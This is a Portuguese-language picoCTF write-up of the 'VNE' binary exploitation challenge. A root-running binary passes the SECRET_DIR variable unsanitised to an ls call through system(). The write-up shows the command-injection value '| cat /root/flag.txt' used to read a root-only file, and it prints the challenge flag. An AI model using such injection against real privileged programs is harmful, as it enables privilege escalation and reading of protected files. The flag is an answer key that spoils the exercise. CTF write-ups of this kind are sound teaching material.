# VNE
## Descrição do Desafio:
Author: Junias Bonou \
Plataforma: [PicoCTF](https://play.picoctf.org/practice/challenge/387?category=6&page=1) \
Categoria: Binary Exploitation \
Dificuldade: Média \
Data: 2023 \
Descrição:
> We've got a binary that can list directories as root, try it out !!
## Passo a Passo da Solução
### 1. Entendendo como o binário funciona
Este desafio é feito por meio de conexão `ssh`, então não há nenhum arquivo para download. Com a conexão estabelecida, nós temos acesso ao bash da máquina, e no diretório do usuário há um arquivo executável `bin` que se executado de primeira vai exibir o erro:
```bash
ctf-player@pico-chall$ ./bin
Error: SECRET_DIR environment variable is not set
```
Como próximo passo, setamos a variável `SECRET_DIR` para algum diretório e vemos qual vai ser a saída:
```bash
ctf-player@pico-chall$ export SECRET_DIR=/challenge
ctf-player@pico-chall$ ./bin
Listing the content of /challenge as root: 
config-box.py  metadata.json  profile
```
E com isso descobrimos que o arquivo lista os arquivos dentro de um diretório, conforme dito na descrição. Mas algo ainda não está claro, que é como este arquivo está listando os arquivos. Para isso podemos digitar qualquer coisa dentro da variável para ver se ocorre algum erro.
```bash
ctf-player@pico-chall$ export SECRET_DIR=---
ctf-player@pico-chall$ ./bin
Listing the content of --- as root: 
ls: unrecognized option '---'
Try 'ls --help' for more information.
Error: system() call returned non-zero value: 512
```
Pronto, descobrimos que o arquivo está usando a `syscall` do comando `ls`.
### 2. Solução
Aqui nós já sabemos quase tudo, só não sabemos onde está a flag e como pegar o conteúdo de um arquivo. Para encontrar a flag basta imprimir o conteúdo de alguns diretórios que não temos permissão para acessar, no caso a pasta `root` foi a primeira a ser testada, e lá estava o arquivo:
```bash
ctf-player@pico-chall$ export SECRET_DIR=/root
ctf-player@pico-chall$ ./bin
Listing the content of /root as root: 
flag.txt
```
A parte de pegar o conteúdo de um arquivo é simples de se fazer, porque se considerarmos que o binário não está tratando o conteúdo da `SECRET_DIR`, podemos tentar passar outro comando via pipe. E por sorte, o binário não está tratando o conteúdo.
```bash
ctf-player@pico-chall$ export SECRET_DIR="| cat /root/flag.txt"
ctf-player@pico-chall$ ./bin
Listing the content of | cat /root/flag.txt as root:
```
### Flag
`picoCTF{Power_t0_man!pul4t3_3nv_1670f174}`
## Autor da WriteUp
[Membro de Exploitation - HenriUz](https://github.com/HenriUz)
